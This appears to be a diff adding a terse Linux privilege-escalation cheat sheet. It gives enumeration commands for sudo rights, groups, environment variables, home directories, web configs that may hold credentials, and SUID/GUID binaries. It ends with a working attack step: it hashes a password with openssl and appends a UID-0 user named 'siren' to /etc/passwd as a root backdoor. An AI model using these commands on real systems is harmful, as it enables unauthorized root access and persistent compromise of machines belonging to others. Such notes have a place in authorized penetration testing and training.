@@ -1,0 +1,48 @@
+Are we a real user?
+sudo -l
+ls -lsaht /etc/sudoers
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+Are any users a member of exotic groups?
+groups <user>
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+Check out your shell's environment variables
+env
+https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+Users?
+cd /home/
+ls -lsaht
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+Web Configs containing credentials?
+cd /var/www/html/
+ls -lsaht
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+https://gtfobins.github.io/
+
+SUID Binaries?
+find / -perm -u=s -type f 2>/dev/null
+
+GUID Binaries?
+find / -perm -g=s -type f 2>/dev/null
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+Can we write as a low-privileged user to /etc/passwd?
+openssl passwd -1
+i<3hacking
+$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
+echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' >> /etc/passwd
+su siren
+id
+
+-------------------------------------------------------------------------------------------------------------------------------
